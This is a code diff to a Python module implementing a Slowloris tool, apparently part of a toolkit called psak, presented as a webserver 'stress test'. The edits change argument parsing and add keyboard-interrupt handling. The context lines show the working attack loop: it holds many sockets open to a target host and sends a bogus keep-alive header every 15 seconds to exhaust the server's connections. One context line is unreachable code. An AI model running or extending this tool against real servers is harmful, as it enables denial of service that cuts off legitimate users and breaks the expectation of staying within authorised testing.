@@ -51,7 +51,7 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.
 """
 """
-This module should only be used from the psak.py class
+This module should only be used from the psak class
 """
 # !/usr/bin/python
 import logging
@@ -66,7 +66,7 @@ class SlowLoris:
 
     def __init__(self, parser):
         self.parser = parser
-        self.parser.add_argument('--host', help="Host to perform stress test on")
+        self.parser.add_argument('host', nargs='?', help="Host to perform stress test on")
         self.parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
         self.parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use in the test", type=int)
         self.parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
@@ -82,9 +82,6 @@ class SlowLoris:
         self.parser.set_defaults(useproxy=False)
         self.parser.set_defaults(https=False)
         self.args = self.parser.parse_args()
-        if len(sys.argv) <= 1:
-            self.parser.print_help()
-            sys.exit(1)
 
         if not self.args.host:
             print("Host required!")
@@ -167,6 +164,8 @@ class SlowLoris:
             except socket.error:
                 break
                 self.list_of_sockets.append(s)
+            except KeyboardInterrupt:
+                break
 
         while True:
             logging.info("Sending keep-alive headers... Socket count: %s", len(self.list_of_sockets))
@@ -175,6 +174,8 @@ class SlowLoris:
                     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                 except socket.error:
                     self.list_of_sockets.remove(s)
+                except KeyboardInterrupt:
+                    break
 
             for _ in range(socket_count - len(self.list_of_sockets)):
                 logging.debug("Recreating socket...")
@@ -183,5 +184,7 @@ class SlowLoris:
                     if s:
                         self.list_of_sockets.append(s)
                 except socket.error:
+                    break
+                except KeyboardInterrupt:
                     break
             time.sleep(15)
